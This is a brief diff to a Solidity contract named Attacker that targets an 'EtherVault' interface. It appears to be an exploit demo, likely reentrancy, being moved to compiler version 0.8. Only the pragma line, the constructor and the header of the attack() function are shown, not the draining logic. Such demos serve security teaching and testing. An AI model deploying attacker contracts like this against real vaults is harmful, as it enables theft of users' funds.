@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.7.0;
+pragma solidity ^0.8.0;
 
 interface IEtherVault {
     function deposit() external payable;
@@ -13,7 +13,7 @@ contract Attacker {
 
     constructor(address _victim) {
         victim = IEtherVault(_victim);
-        owner = msg.sender;
+        owner = payable(msg.sender);
     }
 
     function attack() external payable {
